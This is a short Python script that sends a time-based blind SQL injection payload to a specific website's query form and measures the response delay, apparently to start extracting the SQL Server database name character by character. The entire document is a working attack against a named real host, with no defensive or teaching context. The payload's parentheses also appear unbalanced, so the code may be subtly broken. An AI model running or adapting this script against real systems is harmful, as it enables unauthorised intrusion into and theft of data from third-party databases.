import requests

url='http://www.iuka.cn/chaxun'
con="123';if(ascii(substring(db_name(),1,1)))=0/**/WAITFOR/**/DELAY/**/'0:0:3'-- "
data={
	'con':con,
	'act':'cha'
}
r=requests.post(url,data=data)
print r.elapsed.total_seconds()